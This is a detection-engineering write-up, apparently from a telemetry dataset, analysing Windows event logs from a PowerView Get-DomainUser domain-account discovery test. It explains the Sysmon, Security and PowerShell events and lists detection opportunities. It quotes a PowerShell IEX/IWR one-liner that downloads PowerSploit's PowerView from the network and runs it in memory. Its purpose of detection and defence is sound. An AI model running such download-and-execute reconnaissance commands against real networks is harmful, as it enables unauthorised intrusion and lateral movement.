# T1087.002-11: Domain Account — Get-DomainUser with PowerView

## Technique Context

T1087.002 (Account Discovery: Domain Account) covers the enumeration of domain user accounts from Active Directory. PowerView's `Get-DomainUser` function is one of the most widely used tools for this purpose in penetration testing and real intrusions. PowerView (from the PowerSploit framework) queries Active Directory via LDAP to return comprehensive user information: account names, group memberships, last logon times, SPN configurations, password policies, and more. This intelligence is foundational for identifying high-value targets, planning lateral movement, and finding Kerberoastable service accounts.

The delivery method matters as much as the technique: this test uses `IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing)` to download and execute PowerView directly in memory, avoiding writing a file to disk. In the defended dataset, Defender blocked this execution, producing a `STATUS_ACCESS_DENIED` (0xC0000022) exit code and leaving no LDAP queries or domain user data. With Defender disabled, PowerView downloads and `Get-DomainUser` executes against the `acme.local` domain.

## What This Dataset Contains

This dataset covers a 3-second window (2026-03-14T23:34:02Z–23:34:05Z).

**Process execution chain**: Two Sysmon EID 1 events capture `whoami.exe` instances (PIDs 6580 and 2460) as the pre- and post-execution identity checks. The main PowerShell process (PID 7164) is not in the EID 1 samples — its process creation predates the earliest events in the window, or falls outside the 20-sample set given 15 total sysmon events — but is established from EID 10 events.

The PowerShell command line recorded in the defended analysis is:

```
"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing);
Get-DomainUser -verbose}
```

This pattern — forcing TLS 1.2, then IWR for download, then IEX for execution — is a standard modern PowerShell payload delivery signature.

**Sysmon EID 8 (CreateRemoteThread)**: This is the most forensically significant event in the dataset. EID 8 records:

```
SourceProcessGuid: {9dc7570a-f069-69b5-7a0f-000000000600}
SourceProcessId: 7164
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {9dc7570a-f06d-69b5-7f0f-000000000600}
TargetProcessId: 4988
TargetImage: <unknown process>
NewThreadId: 6984
StartAddress: 0x00007FF77E8753A0
StartModule: -
StartFunction: -
```

The source is PowerShell (PID 7164). The target is `<unknown process>` — a process that started and ended quickly enough that Sysmon could not resolve its image path. This CreateRemoteThread event is tagged `technique_id=T1055,technique_name=Process Injection` by sysmon-modular. This event does not appear in the defended dataset at all, making it a distinctive indicator of the undefended execution.

The `<unknown process>` target is consistent with PowerView spawning a transient helper process during its LDAP query execution, or a .NET thread pool operation. The EID 8 event is not present in the defended run because Defender blocked execution before PowerView's code ran.

**Sysmon EID 10 (3 events)**: Process access events show PowerShell (PID 7164) accessing the `whoami.exe` processes and another process with full access (`0x1FFFFF`).

**Security events**: Three EID 4688 events cover `whoami.exe` and PowerShell processes. All run as SYSTEM.

**PowerShell script block logging**: 93 EID 4104 events and 2 EID 4100 error events (96 total). The EID 4100 events indicate PowerShell errors during execution. The available EID 4104 samples are primarily initialization fragments plus the test framework cleanup invocation. The full 93-event set would include PowerView's function definitions and potentially `Get-DomainUser`'s execution logic.

**DLL loading**: Nine Sysmon EID 7 events capture .NET and PowerShell DLL loading. No Defender DLLs appear, confirming the undefended environment.

Comparing to the defended dataset (25 sysmon, 9 security, 41 powershell): the undefended run has 15 sysmon, 3 security, and 96 powershell events. The security count dropped significantly (3 vs 9), because Defender's process termination events and PowerShell interop events are absent. The powershell event count increased (96 vs 41), reflecting PowerView's actual execution — the module downloaded, was parsed, and `Get-DomainUser` ran, generating far more script block logging than a blocked execution. The unique EID 8 event is only present in the undefended run.

## What This Dataset Does Not Contain

Despite PowerView executing, the LDAP queries it made to enumerate domain users do not appear as discrete log events. Active Directory queries over authenticated LDAP channels do not generate Windows event log entries on the workstation itself — they generate events on the domain controller (Security EID 4662 and 4624), which is outside this dataset's scope. No Sysmon EID 3 network connection events record the LDAP connections to ACME-DC01; the Sysmon configuration filters these connections.

The results of `Get-DomainUser` — the list of domain users discovered — appear only in PowerShell's console output and are not captured in any event.

## Assessment

This dataset documents a successful PowerView execution against a domain-joined workstation with Defender disabled. The primary process-level evidence is in the Security EID 4688 command line (present in full dataset if not in samples). The unique indicator compared to the defended dataset is Sysmon EID 8, documenting a CreateRemoteThread from PowerShell to an unknown process — a byproduct of PowerView's execution that does not appear when Defender blocks the technique.

The 93 EID 4104 script block events contain the complete PowerView.ps1 content as logged by script block recording, including `Get-DomainUser`'s code. This is the richest source of tool-specific evidence.

## Detection Opportunities Present in This Data

**Sysmon EID 8 (CreateRemoteThread)**: PowerShell (PID 7164) creating a remote thread in an unknown process — unique to the undefended execution. The combination of a PowerShell source process, a SYSTEM-level execution context, and an unresolvable target process image name is a high-confidence indicator of in-memory code execution.

**PowerShell EID 4104**: The full PowerView.ps1 download was logged by script block recording across the 93 EID 4104 events. PowerView function signatures (`Get-DomainUser`, `Get-NetDomain`, `Get-NetComputer`) will appear in this log. The download URL containing `PowerShellMafia/PowerSploit` would also appear in the EID 4104 blocks.

**Sysmon EID 1 / Security EID 4688**: The command line pattern `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12` + `IWR` + `IEX` is a standard in-memory download-and-execute pattern. The specific URL `raw.githubusercontent.com/PowerShellMafia/PowerSploit` is a known indicator.

**EID 4100 (PowerShell Error)**: Two error events indicate PowerView encountered a condition during execution. The error details may reveal which `Get-DomainUser` operations failed or what domain configuration limited enumeration.
